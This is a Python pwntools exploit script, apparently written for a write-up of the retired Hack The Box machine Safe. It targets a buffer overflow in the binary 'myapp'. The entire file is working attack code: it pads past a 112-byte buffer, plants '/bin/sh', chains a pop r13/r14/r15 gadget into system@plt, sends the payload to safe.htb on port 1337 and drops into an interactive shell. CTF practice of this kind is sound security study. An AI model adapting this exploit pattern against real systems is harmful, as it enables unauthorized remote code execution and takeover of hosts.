#!/usr/bin/python
from pwn import *

'''
Write-up: https://0xrick.github.io/hack-the-box/safe/
Description: Buffer Overflow exploit for the vulnerable binary "myapp" from Hack The Box retired machine Safe. 
'''

elf = ELF("./binaries/myapp")
rop = ROP(elf)

POP_R13_R14_R15 = (rop.find_gadget(['pop r13', 'pop r14', 'pop r15', 'ret']))[0]
TEST = elf.symbols['test']
SYSTEM = elf.plt['system']

payload = ""
payload += "A" * 112
payload += "/bin/sh\x00"
payload += p64(POP_R13_R14_R15)
payload += p64(SYSTEM)
payload += "A" * 16
payload += p64(TEST)

log.info("pop r13, r14, r15 gadget: " + hex(POP_R13_R14_R15))
log.info("test: " + hex(TEST))
log.info("system: " + hex(SYSTEM))

p = remote("safe.htb",1337)
p.sendline(payload)
p.sendline("\n")
p.interactive()